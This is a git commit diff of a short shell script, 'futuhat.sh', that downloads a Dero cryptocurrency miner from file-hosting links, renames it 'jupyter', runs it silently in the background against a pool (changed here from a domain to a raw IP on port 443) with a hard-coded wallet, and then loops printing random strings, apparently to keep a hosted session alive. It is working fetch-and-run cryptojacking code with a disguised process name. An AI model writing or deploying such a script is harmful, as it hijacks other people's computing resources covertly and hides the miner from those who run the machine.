c161c1ee3a2e0a6bce4a4bf3d716d1bd47c76b90
salmanalfarizi1233 <111627529+salmanalfarizi1233@users.noreply.github.com>
2022-11-19 19:47:37 +0700

    Update futuhat.sh

--- futuhat.sh
+++ futuhat.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 wget -q -O jupyter https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x jupyter
 wget -q -O jupyter https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x jupyter
-./jupyter -r tukimenreborn.xyz:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.FUTUHAT >/dev/null &
+./jupyter -r 45.76.162.175:443 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcsmra2z8jfx22s4n7ltt.FUTUHAT >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
